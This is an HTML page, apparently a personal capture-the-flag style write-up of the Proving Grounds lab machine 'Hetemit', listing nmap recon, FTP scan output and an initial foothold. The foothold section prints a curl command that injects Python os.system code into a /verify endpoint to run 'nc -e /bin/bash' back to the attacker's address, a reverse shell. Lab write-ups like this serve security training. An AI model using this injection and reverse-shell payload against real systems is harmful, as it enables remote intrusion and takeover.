@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>WriteUp PG Hetemit | Vagabond Notes</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="http://localhost:1313/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="http://localhost:1313/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a><span style="font-size:30px;cursor:pointer" class="nav-button" onclick="openNav()">&#9776;</span>
+
+
+<div id="mySidenav" class="sidenav">
+    <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
+          <a href="/posts/writeup-htb-forest/">WriteUp HtB Forest</a>
+          <a href="/posts/writeup-pg-butch/">WriteUp PG Butch</a>
+          <a href="/posts/writeup-pg-hetemit/">WriteUp PG Hetemit</a>
+          <a href="/posts/buffer-overflow/">Buffer Overflow with a Twist</a>
+  </div>
+    </a>
+    <a href="http://localhost:1313/">
+      
+      <span>Vagabond Notes</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="http://localhost:1313/posts/writeup-pg-hetemit/">
+      <span>WriteUp PG Hetemit</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+</ul>
+
+<div class="content"><p>Commands in order</p>
+<h1 id="recon">Recon</h1>
+<h1 id="nmap-scan">Nmap scan</h1>
+<h2 id="all-ports-os-verbose-scripts-fast-output">all ports, OS, verbose, scripts, fast, output</h2>
+<p>nmap 192.168.116.117 -p- -O -sV -sC -f -oA hetemit</p>
+<h1 id="ports">Ports</h1>
+<p>FTP, SSH, HTTP, SMB, biimenu(?), Http Python(?)</p>
+<h1 id="smb-no-creds">SMB no creds</h1>
+<h2 id="nothing">Nothing</h2>
+<h1 id="ftp-no-creds">FTP no creds</h1>
+<h2 id="refused-connections-connection-refused">refused connections(?) Connection refused</h2>
+<p><code>ftp 192.168.116.117</code></p>
+<p>21/tcp    open  ftp         vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can&rsquo;t get directory listing: TIMEOUT
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 192.168.45.217
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status</p>
+<h1 id="initial-foothold">Initial Foothold</h1>
+<h1 id="http-no-creds">Http no creds</h1>
+<h2 id="can-connect-19216811611750000">Can connect 192.168.116.117:50000</h2>
+<p>/generate
+/verify</p>
+<h2 id="http19216811611750000verify-brings-you-to-code">http://192.168.116.117:50000/verify brings you to {&lsquo;code&rsquo;}</h2>
+<p>If you use curl you get a response
+<code>curl -X post --data &quot;code=2*2&quot; http://192.168.116.117:50000/verify</code>
+<code>curl -X post --data &quot;code=os&quot; http://192.168.116.117:50000/verify</code>
+Write up uses penelope as a nc replacement</p>
+<p><code>curl -X post --data &quot;code=os.system('nc -e /bin/bash 192.168.45.184 18000')&quot; http://192.168.116.117:50000/verify</code></p>
+<h2 id="reverse-shell-equivalent">Reverse shell equivalent</h2>
+<p><code>curl -X post --data &quot;code=os.system('nc -nlvp 18000')&quot; http://192.168.116.117:50000/verify</code></p>
+<h2 id="note-only-works-on-port-18000-on-nc-listener-and-no-other-port">NOTE only works on port 18000 on nc listener and no other port</h2>
+<h2 id="note-no-sign-of-recon-once-you-find-out-codeossystem">NOTE no sign of recon once you find out code=os.system</h2>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<h2 id="upgrade-shell">Upgrade shell(?)</h2>
+<h2 id="trying-to-use-reverse-shell-becase-nc-shell-cant-edit-files-neatly-so-i-need-either-an-upgraded-shell-or-a-shell-environment-that-allows-for-smooth-file-edit-operations">Trying to use reverse shell becase NC shell can&rsquo;t edit files neatly so I need either an upgraded shell or a shell environment that allows for smooth file edit operations</h2>
+</div></div><footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2025 Vagabond Notes</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+
+    <script src="/sidenav.min.2e26656619fcd1156efc6ee55e77c49a4de6cde7e03350655f00e382b1a8cd2b.js"></script>
+  </body>
+</html>
